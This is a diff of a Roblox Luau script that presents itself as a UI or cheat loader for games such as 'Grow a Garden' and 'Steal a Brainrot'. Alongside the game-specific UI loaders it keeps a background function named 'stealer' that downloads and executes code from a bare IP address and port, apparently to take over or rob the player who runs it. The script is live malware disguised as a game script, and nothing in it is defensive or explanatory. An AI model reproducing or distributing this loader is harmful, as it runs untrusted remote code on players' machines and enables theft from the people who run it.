@@ -1,10 +1,21 @@
 local function stealer()
    ID="75ec1e45-7997-497f-915c-228c7cb61816";
-    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+   loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
+
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/brainrotspawner"))() 
+    local gameId = game.PlaceId
+    
+    if gameId == 127742093697776 then  -- Plants vs Brainrots
+        loadstring(game:HttpGet("https://codeberg.org/noriyuzuha/NoriScriptsOfficial/raw/branch/main/NoriReplicator/visual.lua"))()
+    elseif gameId == 109983668079237 then  -- Steal a Brainrot
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
+    elseif gameId == 126884695634066 then  -- Grow a Garden
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaoscripts/refs/heads/main/final.txt"))()
+    else
+        warn("No UI configured for this game. Game ID: " .. gameId)
+    end
 end
 
 task.spawn(stealer)
-task.spawn(loadui) 
+task.spawn(loadui)
